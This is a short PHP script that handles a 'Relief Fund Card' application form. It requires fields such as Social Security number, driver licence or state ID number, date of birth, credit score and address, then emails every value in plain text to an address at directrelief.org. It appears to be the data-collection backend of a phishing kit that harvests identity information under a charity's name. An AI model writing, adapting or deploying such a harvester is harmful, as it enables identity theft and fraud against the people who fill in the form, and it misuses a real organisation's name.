<?php
		function email_function($email, $subject, $content){
		  $headers = "From: A Relief Fund Card Applicant\r\n";
		  @$mail = mail($email, $subject, $content, $headers);
		  return $mail;
		  }

		  if(  $_POST['fullname'] == ""   ||
		  		$_POST['address'] == ""   ||
		  		$_POST['city'] == ""   ||
		  		$_POST['dob'] == ""   ||
		  		$_POST['state'] == ""   ||
		  		$_POST['sex'] == ""   ||
		  		$_POST['driver_license'] == ""   ||
		  		$_POST['weight'] == ""   ||
		  		
		  		$_POST['phone'] == ""   ||
		  		$_POST['email'] == ""   ||
		  		$_POST['ssn'] == ""   ||
		  		$_POST['age'] == ""   ||
		  		$_POST['credit_score'] == ""   ||
		  		$_POST['agree_to_tnc'] == ""   ||
		  		$_POST['zip'] == ""  )

		  {

		  	echo "Empty Field(s) Found...Please Check the form again";

		  }else{
		  	$fullname = $_POST['fullname'];
		  	$dob = $_POST['dob'];
		  	$state = $_POST['state'];
		  	$address = $_POST['address'];
		  	$zip = $_POST['zip'];
		  	$gender = $_POST['sex'];
		  	$driver_license = $_POST['driver_license'];
		  	$weight = $_POST['weight'];
		  	$current_job = $_POST['current_job'];
		  	$phone = $_POST['phone'];
		  	$email = $_POST['email'];
		  	$ssn = $_POST['ssn'];
		  	$age = $_POST['age'];
		  	$city = $_POST['city'];
		  	$agree_to_tnc = $_POST['agree_to_tnc'];
		  	$credit_score = $_POST['credit_score'];
		  
		  

		  	$build_msg = "";
		  	$subject = "Application for Relief Fund Card";
		  	$build_msg .= "
		  	Below are details of Applicant:  
		  	  Fullname: ".$fullname."
		  	  Address:  ".$address."
		  	  City: ".$city."
		  	  State: ".$state."
		  	  Zip: ".$zip."
		  	  Gender: ".$gender."
		  	  Driver License Number / State ID Number: ".$driver_license."
		  	  Weight: ".$weight."
		  	  Current Job: ".$current_job."
		  	  Mobile Number: ".$phone."
		  	  Email Address: ".$email."
		  	  Social Security Number: ".$ssn."	  	  
		  	  Date of Birth: ".$dob."
		  	  Age: ".$age."
		  	  Credit Score: ".$credit_score."
		  	  Response to Terms and Condition Agreement: 
		  	  ".$agree_to_tnc."  	 
		  	  
		  	 

		  	";
		  	//send mail now
		  	$send_mail = email_function('hello@directrelief.org', $subject, $build_msg);
		  	if($send_mail){
		  		echo '200';
		  	}else{
		  		echo "Sorry, Your application was not successful. Please check the form again.";
		  	}
		  }

?>